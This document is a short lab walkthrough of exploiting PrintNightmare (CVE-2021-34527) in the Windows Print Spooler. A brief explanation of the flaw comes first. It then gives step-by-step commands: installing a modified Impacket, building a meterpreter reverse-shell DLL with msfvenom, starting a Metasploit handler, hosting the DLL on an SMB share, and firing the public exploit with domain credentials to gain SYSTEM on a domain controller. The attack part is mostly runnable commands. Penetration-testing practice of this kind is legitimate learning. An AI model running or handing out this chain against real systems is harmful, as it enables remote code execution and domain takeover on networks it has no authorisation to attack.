## Introduction
- PrintNightmare(CVE-2021-34527) is a vulnerability which affects the Microsoft Windows Print Spooler Service.
- The exploit exists within the RpcAddPrinterdriver. This exists to enable remote printing and driver installation.
- This provides the ability to install new printer drivers to a remote print spooler.
- Essentially, this becomes an exploit because it means any “authenticated” user, not just the trusted, permitted sysadmins, can add any ‘Print Driver’ to Windows.
- Any random user can escalate this privilege to become a domain admin. Then, if they’re a malicious actor, start causing chaos with some nasty code.
- It has the potential to enable cyber-attackers to gain complete control of an affected system.
- As the Print Spooler service is run on Domain Controllers, an attacker could insert DLLs into a remote Windows host, whereby a regular domain user can execute code as SYSTEM on the Domain Controller.

**For more details follow** - https://github.com/cube0x0/CVE-2021-1675
## Practical implementation on lab:
1. Scanning for vulnerability of PrintNightmare.
![[printnightmare1.png]]
From the output, we can clearly say that this is vulnerable.

2. Before running the exploit you need to install another version of Impacket.
```python
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

3. Downloading main exploit code.
**You can find main exploit code here** --> https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
**In local machine, have a look here** --> /opt/exploits

4. payload creation using msfvenom.
```python
┌──(kali㉿kali)-[/opt/exploits]
└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.19 LPORT=4444 -f dll > shell.dll
```

5. Starting a multi handler using metasploit
```python
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > set lhost 192.168.1.19
lhost => 192.168.1.19
msf6 exploit(multi/handler) > run
```

6. Starting a smb2 share.
![[printnightmare2.png]]

7. Starting the exploitation
```python
┌──(kali㉿kali)-[~]
└─$ sudo python3 CVE-2021-1675 marvel.local/fcastle:Password1@192.168.1.15 '\\192.168.1.19\share\shell.dll
```

